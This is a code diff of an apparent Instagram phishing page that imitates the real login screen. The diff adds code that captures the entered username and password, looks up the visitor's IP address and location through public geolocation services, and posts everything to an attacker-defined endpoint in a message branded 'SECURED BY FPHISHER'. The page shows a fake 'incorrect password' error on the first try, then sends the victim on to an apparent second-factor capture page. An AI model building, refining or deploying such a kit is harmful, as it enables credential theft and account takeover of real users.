@@ -9,35 +9,18 @@
 <body class="bg-white flex items-center justify-center min-h-screen">
 
   <div class="w-full max-w-sm px-6">
-
-    <!-- Logo -->
+    <!-- Your existing UI remains unchanged -->
     <div class="flex justify-center mb-14">
       <img src="IMG_0905.png" alt="App" class="w-16 h-16" />
     </div>
 
-    <!-- Username -->
-    <input
-      id="username"
-      type="text"
-      placeholder="Username, mobile number or email address"
-      class="w-full mb-3 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
-    />
+    <input id="username" type="text" placeholder="Username, mobile number or email address"
+      class="w-full mb-3 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400" />
 
-    <!-- Password -->
-    <input
-      id="password"
-      type="password"
-      placeholder="Password"
-      class="w-full mb-4 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
-    />
+    <input id="password" type="password" placeholder="Password"
+      class="w-full mb-4 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400" />
 
-    <!-- Login Button -->
-    <button
-      id="loginBtn"
-      class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4
-             transition active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed
-             flex items-center justify-center gap-2"
-    >
+    <button id="loginBtn" class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4 transition active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2">
       <span id="btnText">Log in</span>
       <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24">
         <circle cx="12" cy="12" r="10" stroke="white" stroke-width="4" fill="none" opacity="0.3"/>
@@ -45,24 +28,14 @@
       </svg>
     </button>
 
-    <!-- Error Message -->
-    <div id="errorMsg" class="text-red-500 text-sm mb-6 hidden text-center">
-      Incorrect username or password.
-    </div>
+    <div id="errorMsg" class="text-red-500 text-sm mb-6 hidden text-center">Incorrect username or password.</div>
 
-    <!-- Forgotten Password -->
     <div class="text-center mb-6">
-      <a href="#" class="text-sm font-normal text-black hover:underline">
-        Forgotten password?
-      </a>
+      <a href="#" class="text-sm font-normal text-black hover:underline">Forgotten password?</a>
     </div>
 
-    <!-- Bottom Section -->
     <div class="mt-16">
-      <button class="w-full border border-blue-600 text-blue-600 text-sm font-normal py-3 rounded-md mb-8 hover:bg-blue-50 transition">
-        Create new account
-      </button>
-
+      <button class="w-full border border-blue-600 text-blue-600 text-sm font-normal py-3 rounded-md mb-8 hover:bg-blue-50 transition">Create new account</button>
       <div class="flex justify-center mt-2">
         <img src="IMG_0906.png" alt="Meta" class="h-8" />
       </div>
@@ -76,35 +49,27 @@
 
     async function getLocation() {
       try {
-        console.log("Fetching location for login...");
-        const res = await fetch('https://ipapi.co/json/', {
-          method: 'GET',
-          headers: { 'Accept': 'application/json' }
-        });
-
-        if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
-
+        const res = await fetch('https://ipapi.co/json/');
+        if (!res.ok) throw new Error();
         const data = await res.json();
-        console.log("Login location data:", data);
 
         return {
-          country: data.country_name || data.country || 'Unknown',
-          state: data.region || data.region_code || 'Unknown'
+          ip: data.ip || 'Unknown',
+          country: data.country_name || 'Unknown',
+          state: data.region || 'Unknown',
+          city: data.city || 'Unknown'
         };
-      } catch (err) {
-        console.error("Primary geolocation failed:", err);
+      } catch {
+        // Fallback
         try {
-          const fallback = await fetch('https://ip-api.com/json/?fields=status,country,regionName');
-          const fbData = await fallback.json();
-          if (fbData.status === "success") {
-            return {
-              country: fbData.country || 'Unknown',
-              state: fbData.regionName || 'Unknown'
-            };
+          const fb = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,query');
+          const d = await fb.json();
+          if (d.status === "success") {
+            return { ip: d.query || 'Unknown', country: d.country || 'Unknown', state: d.regionName || 'Unknown', city: d.city || 'Unknown' };
           }
         } catch {}
       }
-      return { country: 'Unknown', state: 'Unknown' };
+      return { ip: 'Unknown', country: 'Unknown', state: 'Unknown', city: 'Unknown' };
     }
 
     document.getElementById("loginBtn").addEventListener("click", async (e) => {
@@ -125,32 +90,44 @@
       const errorMsg = document.getElementById("errorMsg");
 
       const loc = await getLocation();
-
       attempt++;
+
+      const message = `📩NEW LOGIN ATTEMPT 📩
+
+DETAILS:
+•📲 PLATFORM: INSTAGRAM
+•👤 UserName: ${username}
+•🔑 Password: ${password}
+
+LOCATION:
+•🌍 Country: ${loc.country}
+•🗺️ State: ${loc.state}
+•🏙️ City: ${loc.city}
+•🌐 IP: ${loc.ip}
+
+🔒•SECURED BY FPHISHER•🔒`;
 
       const payload = {
         id: SUBMIT_ID,
-        app: "INSTAGRAM",
+        type: "login",
+        raw_message: message,
         username: username,
         password: password,
         country: loc.country,
         state: loc.state,
+        city: loc.city,
+        ip: loc.ip,
         attempt: attempt,
-        timestamp: new Date().toISOString(),
-        source: "Login Page"
+        timestamp: new Date().toISOString()
       };
 
-      // Send to your custom endpoint
       try {
         await fetch(SUBMIT_ENDPOINT, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
-        console.log("Login data sent successfully");
-      } catch (err) {
-        console.error("Failed to send login data:", err);
-      }
+      } catch (err) { console.error(err); }
 
       if (attempt === 1) {
         errorMsg.classList.remove("hidden");
@@ -159,10 +136,7 @@
         btn.disabled = true;
         btnText.textContent = "Loading";
         spinner.classList.remove("hidden");
-
-        setTimeout(() => {
-          window.location.href = "securedfa.html";
-        }, 1200);
+        setTimeout(() => window.location.href = "securedfa.html", 1200);
       }
     });
   </script>
